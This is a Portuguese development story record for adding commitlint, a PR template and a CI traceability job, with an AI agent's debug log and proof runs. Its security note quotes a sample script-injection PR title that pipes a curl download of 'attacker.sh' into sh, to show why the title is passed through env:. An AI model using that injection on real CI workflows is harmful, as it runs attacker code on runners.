---
baseline_commit: 247fafc02e567f4b22251e2e0436da80889ef7b7
---

# Story 0.5: Rastreabilidade — commits e PRs

Status: review

<!-- Note: Validation is optional. Run validate-create-story for quality check before dev-story. -->

## Story

As a construtor,
I want commits convencionais e PRs ligados a Story/FR,
so that toda mudança seja auditável (pilar Auditável).

## Acceptance Criteria

1. **Given** commitlint configurado
   **When** um commit do PR foge do padrão convencional
   **Then** o job `traceability` **falha** apontando a regra violada.

2. **Given** que o merge para `main` é **squash**
   **When** o título do PR foge do padrão convencional
   **Then** o job `traceability` **falha** — o título do PR é o que vira commit na `main`, e é o que realmente protege o histórico.

3. **Given** um PR aberto
   **When** o corpo não referencia nenhuma Story nem FR
   **Then** o job `traceability` **falha** indicando o que falta.

4. **Given** um template de PR
   **When** alguém abre um PR pela interface do GitHub
   **Then** o corpo já vem com as seções que a AC #3 exige.

5. **Given** violação deliberada de cada uma das três checagens
   **When** o CI roda
   **Then** o job `traceability` **falha em cada caso**, com os demais jobs verdes — provado por execução.

## Tasks / Subtasks

- [x] **Task 1 — commitlint** (AC: #1, #2)
  - [x] `pnpm add -D @commitlint/cli@21.2.1 @commitlint/config-conventional@21.2.0`
  - [x] `commitlint.config.js` estendendo `@commitlint/config-conventional` (ESM — o `package.json` tem `"type": "module"`)
  - [x] Script `commitlint` para uso local

- [x] **Task 2 — Job `traceability`** (AC: #1, #2, #3)
  - [x] Novo job no `ci.yml`, **apenas** em `pull_request` (em push na `main` não há PR)
  - [x] `fetch-depth: 0` no checkout — o commitlint precisa do range de commits
  - [x] Passo 1: validar os commits do PR (`--from origin/main --to HEAD`)
  - [x] Passo 2: validar o **título do PR** — o mais importante, por causa do squash
  - [x] Passo 3: validar que o corpo referencia `Story` ou `FR-`
  - [x] **Passar título e corpo via `env:`, nunca interpolar `${{ }}` dentro do `run:`** (ver *Segurança* abaixo)

- [x] **Task 3 — Template de PR** (AC: #4)
  - [x] `.github/PULL_REQUEST_TEMPLATE.md` com seções: o que muda, por quê, Story/FR referenciada, como foi verificado
  - [x] O template deve produzir, por padrão, um corpo que **passa** na checagem da AC #3

- [x] **Task 4 — Provar as três checagens** (AC: #5)
  - [x] Violação de commit não-convencional → `traceability` vermelho
  - [x] Violação de título de PR não-convencional → `traceability` vermelho
  - [x] Violação de corpo sem Story/FR → `traceability` vermelho
  - [x] Confirmar demais jobs **verdes** em cada caso
  - [x] Reverter (commits listando arquivos explicitamente)

## Dev Notes

### 🔴 O ponto que muda o desenho desta story: squash merge

Todos os PRs deste projeto entram com **`--squash`**. Consequência direta:

- Os commits individuais do PR **não chegam à `main`**. Viram um só.
- **O título do PR vira a mensagem desse commit.**

Portanto, validar apenas os commits do PR — que é o que a maioria dos setups de commitlint faz — deixaria o histórico da `main` desprotegido. Um PR com commits impecáveis e título `atualiza coisas` produziria exatamente isso na `main`.

Daí a AC #2 ser separada da AC #1. **A validação do título do PR é a que realmente cumpre o pilar Auditável aqui.**

### O padrão de prova do épico gera commits `Revert "..."`

As stories 0.1–0.4 estabeleceram: commit que introduz violação → CI vermelho → `git revert`. O `git revert` gera mensagens como:

```
Revert "test: introduz violacoes deliberadas para provar os gates"
```

Isso **não** é conventional commit. Sem tratamento, o commitlint reprovaria o próprio método de trabalho do épico.

**Não é problema:** o commitlint tem ignores padrão, e um deles é exatamente `test(/^(R|r)evert (.*)/)`. Mensagens de revert são ignoradas automaticamente. **Não desabilitar `defaultIgnores`.**

### ⚠️ Segurança: script injection no workflow

Interpolar `${{ github.event.pull_request.title }}` diretamente dentro de um bloco `run:` é **vulnerabilidade conhecida**: o título é conteúdo controlável por quem abre o PR, e é substituído no script *antes* do shell executar. Um título como `"; curl attacker.sh | sh #` executaria comando arbitrário no runner.

**Sempre passar por `env:`** e referenciar como variável de shell:

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE" | pnpm exec commitlint
```

Assim o valor entra como dado, não como código. Isso importa mais aqui do que nas stories anteriores porque é o primeiro job que consome **entrada controlada pelo usuário**.

### Estado atual do CI (pós-Story 0.4, merge `247fafc`)

`.github/workflows/ci.yml` tem **6 jobs**:

| Job | Precisa de Node? | Observação |
|---|---|---|
| `lint` | sim | `pnpm lint` |
| `typecheck` | sim | `pnpm typecheck` |
| `test` | sim | `pnpm test:coverage` + cobertura no PR |
| `arch` | sim | `pnpm arch` (dependency-cruiser) |
| `security-deps` | não | Trivy |
| `security-secrets` | não | Gitleaks (`fetch-depth: 0`) |

`permissions` global: `contents: read`. O job `test` eleva para `pull-requests: write`.

**Não existe** `.github/PULL_REQUEST_TEMPLATE.md` — verificado.

O job `traceability` **precisa** de Node (commitlint é pacote npm) e de `fetch-depth: 0`.

### Convenção de commits já em uso no repositório

Os commits do Epic 0 já seguem conventional commits — vale conferir os tipos usados para que a config não reprove o histórico existente:

| Tipo | Uso no projeto |
|---|---|
| `feat` | novas capacidades (stories 0.1–0.4) |
| `fix` | correções (`fix: Trivy nao escaneava devDependencies`) |
| `chore` | setup, configuração (`chore: commit inicial`) |
| `docs` | registro de execução das stories |
| `test` | commits de prova dos gates |

Todos estão no conjunto padrão do `@commitlint/config-conventional`. **Não é necessário customizar `type-enum`.**

O `.github/dependabot.yml` da Story 0.3 já configura `commit-message.prefix: chore` — os PRs do Dependabot vão passar.

### Armadilhas conhecidas

- **`commitlint.config.js` com `"type": "module"`.** Precisa ser ESM (`export default {...}`). Se der problema de carregamento, renomear para `.mjs` — **não** usar `module.exports`.
- **`--from origin/main` exige o ref disponível.** Com `fetch-depth: 0` o checkout traz tudo, mas `origin/main` pode não estar como ref local; usar `git fetch origin main` antes, ou o SHA base do PR (`github.event.pull_request.base.sha`).
- **Job só em `pull_request`.** Em `push` na `main` não existe título nem corpo de PR — o job falharia por referência vazia. Usar `if: github.event_name == 'pull_request'`.
- **A checagem de corpo não pode ser frouxa demais.** Procurar literalmente por `Story` ou `FR-` num corpo que sempre contém o template geraria falso verde. A regex deve exigir referência **preenchida**, não o rótulo vazio do template.
- **Template de PR não é gate.** Quem abre PR pela CLI (`gh pr create --body`) não recebe o template. Por isso a AC #3 valida o corpo — o template é conveniência, a checagem é o gate.
- **Nome do job.** `traceability` vira required check na 0.7.

### Aprendizados das Stories 0.1–0.4 (aplicar)

- **Verificar o artefato, não o exit code.** Confirmar que o commitlint realmente processou commits (contagem no output), não só que retornou 0. Cinco ferramentas já enganaram assim neste épico.
- **Isolar a reprovação.** A prova da 0.4 conseguiu `arch` vermelho com cinco jobs verdes. Repetir: cada violação deve reprovar **só** o `traceability`.
- **Commit de prova lista arquivos explicitamente**, nunca `git add -A`.
- **Registrar o que não foi provado.** Na 0.4, `no-cross-adapter` e `no-circular` ficaram declaradas mas não exercitadas, e isso está anotado. Fazer o mesmo aqui se alguma checagem não puder ser provada.

### Testing standards

Nenhum teste de produto. As "provas" são as três violações da Task 4. A suíte permanente (`tests/toolchain.test.ts`) deve seguir verde.

### Project Structure Notes

- `commitlint.config.js` (novo, raiz)
- `.github/PULL_REQUEST_TEMPLATE.md` (novo)
- `.github/workflows/ci.yml` (job `traceability`; **não reescrever**)
- `package.json` (devDependencies + script)

### References

- [Source: _bmad-output/planning-artifacts/epics.md#Story 0.5] — user story e AC original
- [Source: QUALITY-GATE.md#2] — commitlint + template de PR, pilar Auditável
- [Source: QUALITY-GATE.md#3] — "commitlint passa + PR referencia Story/FR + Biome"
- [Source: ARCHITECTURE-SPINE.md#AD-3] — auditoria com autor e origem (o análogo em runtime deste gate)
- [Source: ARCHITECTURE-SPINE.md#AD-11] — gateway de CI obrigatório
- [Source: 0-4-fronteiras-da-arquitetura-dependency-cruiser.md#Debug Log References] — padrão de isolamento da prova

## Dev Agent Record

### Agent Model Used

claude-opus-5

### Debug Log References

**🔴 O gate era contornável em dois cliques.** `on: pull_request` sem `types` usa o default `[opened, synchronize, reopened]` — **`edited` não está incluído**. Consequência: bastava abrir o PR com título válido, esperar o verde, **editar o título para qualquer coisa** e mergear. Como o merge é squash, o título novo iria para a `main` sem revalidação.

As checagens #2 e #3 — as que dependem de metadados do PR, não de commits — eram burláveis por completo. Corrigido com `types: [opened, synchronize, reopened, edited]`. Custo aceito: edições de PR redisparam os demais jobs; evento raro, ~20s por run.

**Este é um modo de falha novo no épico.** Os cinco anteriores eram *ferramentas configuradas que não mordiam*. Este é diferente: a ferramenta funcionava, mas **o gatilho não cobria o caminho de ataque**. Um gate correto no lugar errado.

**🔴 `git revert` não limpa a prova do commitlint.** As stories 0.1–0.4 estabeleceram o padrão "commit que viola → CI vermelho → `git revert`". Aqui isso **não funciona**: o commitlint valida o range `base..head`, ou seja, o **histórico inteiro do PR**, não o estado final da árvore. O commit ruim continua no range depois do revert e o job segue vermelho para sempre.

Sintoma observado: a prova #3 (corpo sem referência) falhou no step **errado** — reprovou em `commits convencionais` por causa do commit ruim da prova #1, que já tinha sido revertido. Evidência contaminada.

Solução aplicada: `git reset --hard` até antes dos commits de prova + `git push --force-with-lease`. A evidência da prova #1 sobrevive nos logs do CI (run `31286136314`), que são imutáveis.

**Regra para as stories seguintes:** provas que envolvem **mensagem de commit** exigem remoção do histórico, não revert. Provas que envolvem **conteúdo de arquivo** (todas as anteriores) o revert resolve.

**🟡 Comentários HTML contam como corpo do PR.** A primeira versão do template trazia o exemplo `"Story 1.1"` dentro de um comentário `<!-- -->`. Como comentários fazem parte do corpo, a regex casaria e **aprovaria um PR onde ninguém preencheu nada** — falso verde clássico. Corrigido nos dois lados: a checagem remove comentários antes de procurar (via `perl -0pe 's/<!--.*?-->//gs'`), e o placeholder passou a ser `Story _._`, que não casa.

Validado nos cinco casos: template puro **reprova**, template preenchido passa, `FR-14` passa, corpo vazio **reprova**, só-comentário **reprova**.

**🟢 `gh pr edit` falhou com erro de Projects (classic).** A CLI retornou erro de GraphQL não relacionado ao que se pedia. Contornado com `gh api -X PATCH /repos/.../pulls/10`, que funcionou. Sem impacto no gate — apenas registrado para poupar diagnóstico futuro.

**Verificação de artefato, não de exit code.** O log do job confirma processamento real: `found 0 problems, 0 warnings` nos dois passos de commitlint e as referências listadas uma a uma (`referencia encontrada: Story 0.5`). Não é verde por omissão.

### Completion Notes List

- **Task 1** — `@commitlint/cli@21.2.1` + `@commitlint/config-conventional@21.2.0`. `commitlint.config.js` em ESM, com `header-max-length: 100`. `defaultIgnores` **mantido** — inclui `/^(R|r)evert (.*)/`, sem o qual o método de prova do próprio épico reprovaria.
- **Task 2** — job `traceability`, `if: github.event_name == 'pull_request'`, `fetch-depth: 0`. Três steps: commits (`--from base --to head`), título do PR, corpo do PR. Título e corpo via `env:`, nunca interpolados no `run:`.
- **Task 3** — `.github/PULL_REQUEST_TEMPLATE.md` com seções o-que-muda / por-quê / Story-FR / como-foi-verificado / riscos. O placeholder **não** satisfaz a checagem, de propósito.
- **Task 4** — evidências abaixo.

**AC #5 — três provas, cada uma isolada:**

| Prova | Step que reprovou | Demais jobs | Run |
|---|---|---|---|
| Commit não-convencional | `commits convencionais` | 6 verdes | `31286136314` |
| Título de PR inválido | `titulo do PR convencional` | 6 verdes | `31286192943` |
| Corpo sem Story/FR | `PR referencia Story ou FR` | 6 verdes | `31286390369` |

Na prova #3, o log mostra a sequência exata esperada: commits ✔, título ✔, corpo ✖ com a mensagem `O corpo do PR nao referencia nenhuma Story nem FR`.

A prova #2 tem valor duplo: além de exercitar a checagem de título, **comprova que o `edited` dispara o workflow** — ou seja, valida a correção do trigger.

**Limitação conhecida — checagem #3 é permissiva.** Qualquer menção a `Story <n>.<n>` ou `FR-<n>` em qualquer lugar do corpo satisfaz, inclusive de passagem. No log deste próprio PR ela encontrou `Story 0.5`, `Story 1.1` e `FR-14`, sendo que as duas últimas eram exemplos no texto explicativo. Verificar que a referência está **na seção correta** exigiria parsing do template, que quem usa `gh pr create --body` não recebe. **Registrado, não corrigido.**

### File List

- `commitlint.config.js` (novo)
- `.github/PULL_REQUEST_TEMPLATE.md` (novo)
- `.github/workflows/ci.yml` (modificado — job `traceability` + `types` no trigger)
- `package.json` (modificado — 2 devDependencies + script `commitlint`)
- `pnpm-lock.yaml` (modificado)
- `_bmad-output/implementation-artifacts/0-5-rastreabilidade-commits-e-prs.md` (modificado)
- `_bmad-output/implementation-artifacts/0-4-fronteiras-da-arquitetura-dependency-cruiser.md` (modificado — status `done`)
- `_bmad-output/implementation-artifacts/sprint-status.yaml` (modificado)

## Change Log

| Data | Evento |
|---|---|
| 2026-08-08 | Tasks 1–3: commitlint, job `traceability`, template de PR |
| 2026-08-08 | PR #10 aberto — o próprio PR já exercita o gate |
| 2026-08-08 | Falso verde corrigido: comentários HTML do template casavam com a regex |
| 2026-08-08 | **Gate contornável corrigido**: `edited` acrescentado ao trigger |
| 2026-08-08 | Três provas isoladas no CI (ACs #1, #2, #3, #5) |
| 2026-08-08 | Commits de prova removidos do histórico com `--force-with-lease` (revert não basta para commitlint) |
| 2026-08-08 | Story para `review` |
